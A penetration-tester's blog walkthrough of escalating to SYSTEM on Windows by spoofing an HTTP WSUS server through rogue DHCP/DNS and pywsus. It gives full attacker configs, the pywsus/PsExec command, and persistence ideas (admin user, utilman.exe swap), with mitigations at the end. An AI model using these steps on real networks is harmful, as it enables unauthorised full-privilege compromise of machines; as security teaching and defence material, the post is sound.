---
layout: post
title: Exploiting WSUS misconfiguration to priviledge escalate controlling DHCP
---

In this post we will explore a simulation of a possible attack that I have spotted in the wild. Given that by company policy I am not allowed to alter the original PCs, this will be a simulated environment using VMs recreated as loyally as possible to the original golden image.

# Pre-requisites
- Being able to control the network's DHCP
  - This can be achieved in multiple ways in reality, but the way I'll do it is by bridging network interfaces and disconnecting the "wifi"
  - An example of more "stealthy" attack would be to host a wifi network
- Having a DNS server (possibly on the same network)
- [pywsus](https://github.com/GoSecure/pywsus)
- [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/) or any Microsoft signed executable

# Detection
```
PS > reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
  [...output...] http://wsusserver.domain.internal

PS > reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
  UseWUServer    REG_DWORD    0x1
```

If we get http (and NOT https) in the first output and 0x1 in the second, it means the system is vulnerable and we note down the domain name of the WSUS server.

This attack uses the fact that http requests are not authenticated. We also should be wary of people possibly sniffing DNS queries if they own the network as often the domain names for the WSUS servers are fairly recognizeable and could leak the targeted domain to spoof later on (finding out the domain name without access to the machine).

# Setup
To perform this attack I will use a Kali machine with the following packages installed from `apt`: `isc-dhcp-server` and `dnsmasq` (technically dnsmasq also has a DHCP server) and the git clone'd pywsus
The target machine is a Windows 10 machine. We normally are only given a AD User without access to the machine's administration.

We want the two machines to be in the same network, either by having one common "internet-less" connection or, say in a more realistic scenario, by being in the same wifi (and maybe guessing the often weak admin password for the router). Normally this attack is performed using [bettercap](https://github.com/bettercap/bettercap) but in this case I decided to go for a different route as I am not sure how easy it is to get into the same subnet in the company environment (and I didn't want to try and upset the IT departent (again)).

## dhcp
We will configure the attack box on IP `192.168.222.1` as the gateway, dhcp server and dns server (and later on the wsus server too).
The subnet will be `192.168.222.0/24` and we will let the Windows client pick any IP

Edit `/etc/dhcp/dhcpd.conf`:

```
subnet 192.168.222.0 netmask 255.255.255.0 {
  interface eth1;
  range 192.168.222.10 192.168.222.50;
  option subnet-mask 255.255.255.0;
  option routers 192.168.222.1;
  option domain-name-servers 192.168.222.1, 192.168.222.10;
  option domain-name "swag.com";
}
```


Edit `/etc/default/isc-dhcp-server`:

```
# Edit with the interface that shares the connection with the Windows machine
INTERFACESv4="eth1"
INTERFACESv6=""
```

```
sudo ifconfig eth1 192.168.222.1/24
sudo systemctl restart isc-dhcp-server.service
```

## dns
We modify `/etc/dnsmasq.conf` as follows:

```
domain-needed
listen-address=127.0.0.1
listen-address=192.168.222.1
bind-interfaces

address=/wsusserver.domain.internal/192.168.222.1
```


```
sudo ifconfig eth1 192.168.222.1/24
sudo systemctl restart dnsmasq
```

----

Now we verify that the Windows box, once connected to the same network (might require to disable and re-enable the interface) automatically gets an IP address and sets the DNS to our attacker box. This is important because changing the DNS settings or any adapter's settings requires admin privileges.

Opening a Powershell (or cmd) and running `ping wsusserver.domain.internal` should yield the IP of our attacker machine. If this is all correct we can proceed with the attack

# Attack

First we download the PsExec binary files from [Sysinternals](https://live.sysinternals.com/), it's important that the executable we're gonna use for the payload is signed by Microsoft and this is a great candidate.
Second, we git pull [pywsus](https://github.com/GoSecure/pywsus) which will emulate a WSUS server and serve a fake update with our payload. This may require the manual install of some libraries which I found perfectly available using `apt install`.

Once pulled and downloaded all that's left to do is giving a command and deploying the payload, for our example we will just write the output of `whoami` to a file in `C:\` but potentially this can be used to add a user as admin or achieve other types of persistence such as moving the `cmd.exe` in the place of `utilman.exe`

```
python3 pywsus.py -H 192.168.222.1 -p 8530 -e /path/to/PsExec64.exe -c '/accepteula /s cmd.exe /c "whoami > C:\\poc.txt"'
```

Then we either wait for Windows to check updates or we start the update check ourselves and wait for it to "install updates". You should find a file in `C:\poc.txt` containing `nt authority/system` confirming that we did in fact ran a command as System on the target machine.

# Mitigations
As suggested from the Github page of pywsus, here's some possible mitigations for this attack:
The three major ways of generating a certificate for a WSUS server are:
- Using an internal PKI for which a Root CA certificate is deployed on domain computers and a certificate signed by that Root CA is used to serve WSUS updates
- Purchasing a certificate signed by a third-party CA authority trusted in the Windows OS trust store
- Using a self-signed certificate and push a copy of this certificate on all domain computers using a GPO

As a possible IOC, the attacked computer will report extra updates or at least it keeps a list of them. Looking for non-approved ones would help.
